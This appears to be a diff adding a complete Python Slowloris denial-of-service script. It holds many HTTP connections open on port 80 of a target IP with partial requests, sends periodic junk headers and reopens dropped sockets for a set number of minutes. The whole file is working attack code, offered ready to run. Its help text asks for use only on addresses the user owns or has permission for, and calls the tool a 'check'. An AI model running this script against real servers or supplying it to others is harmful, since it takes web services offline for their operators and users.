@@ -1,0 +1,104 @@
+#!/usr/bin/env python3
+from multiprocessing.dummy import Pool as ThreadPool
+from socket import socket, AF_INET, SOCK_STREAM
+from configs import USER_AGENT, ACCEPT_LANGUAGE
+from argparse import ArgumentParser, Namespace
+from ipaddress import ip_address
+from typing import List
+import random, time, sys
+
+headers = [USER_AGENT, ACCEPT_LANGUAGE]
+
+
+def setup_socket(ip):
+    sock = socket(AF_INET, SOCK_STREAM)
+    sock.settimeout(4)
+    sock.connect((ip, 80))
+    sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 1337)).encode("utf-8"))
+    for header in headers:
+        sock.send("{}\r\n".format(header).encode("utf-8"))
+    return sock
+
+
+def send_headers(sock: socket) -> None or socket:
+    try:
+        sock.send("X-a: {}\r\n".format(random.randint(1, 4600)).encode("utf-8"))
+    except:
+        return sock
+
+
+def run(args: Namespace) -> None:
+    try:
+        ip = str(ip_address(args.ip))
+    except ValueError as exc:
+        print(exc)
+        return
+
+    count = args.number
+    sockets = []
+
+    print("---")
+    print("Starting DoS attack on {}. Connecting to {} sockets.".format(ip, count))
+
+    for i in range(1, count + 1):
+        sys.stdout.write(f"Socket connections ({ip}): {i}\r")
+        try:
+            sock = setup_socket(ip)
+        except:
+            continue
+        sockets.append(sock)
+    print()
+
+    t_end = time.time() + 60 * args.minutes
+    threads = min(max(args.threads, 1), 4)
+
+    while time.time() < t_end:
+        print(f"Connected to {len(sockets)} sockets.\nSending headers...")
+
+        with ThreadPool(threads) as pool:
+            for sock in pool.map(send_headers, sockets):
+                sock and sockets.remove(sock)
+
+        for i in range(1, count - len(sockets) + 1):
+            sys.stdout.write(f"Re-opening closed sockets ({ip}): {i}\r")
+            try:
+                sock = setup_socket(ip)
+            except:
+                continue
+            sockets.append(sock)
+
+        print()
+        time.sleep(threads)
+
+
+def parse_options(args: List[str]) -> Namespace:
+    parser = ArgumentParser(
+        description="Check for Slowloris DOS (Denial of Service). Please use this on IP addresses you own or you permission to execute this check/attack."
+    )
+    parser.add_argument("ip", help="IP to attack")
+    parser.add_argument(
+        "-n",
+        "--number",
+        help="Number of concurrent connections (Default: 100)",
+        default=100,
+        type=int,
+    )
+    parser.add_argument(
+        "-m",
+        "--minutes",
+        help="Minutes to test concurrent connections (Default: 1)",
+        default=1,
+        type=int,
+    )
+    parser.add_argument(
+        "-t",
+        "--threads",
+        help="Threads to execute the attack (Default: 1)",
+        default=1,
+        type=int,
+    )
+    return parser.parse_args(args)
+
+
+if __name__ == "__main__":
+    run(parse_options(sys.argv[1:]))
